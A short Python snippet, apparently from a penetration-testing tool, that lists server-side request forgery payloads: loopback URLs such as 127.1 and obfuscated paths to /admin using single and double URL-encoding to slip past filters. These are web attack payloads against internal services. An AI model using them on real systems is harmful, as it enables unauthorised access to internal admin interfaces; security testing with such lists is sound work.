BASIC_PAYLOADS = [
    "http://127.0.0.1",
    "http://127.1",
    "http://127.0.0.1:80",
]

OBFUSCATED_PAYLOADS = [
    "http://127.1/admin",
    "http://127.1/ad%6din",
    "http://127.1/ad%2561min",
]

def get_all_payloads():
    return BASIC_PAYLOADS + OBFUSCATED_PAYLOADS
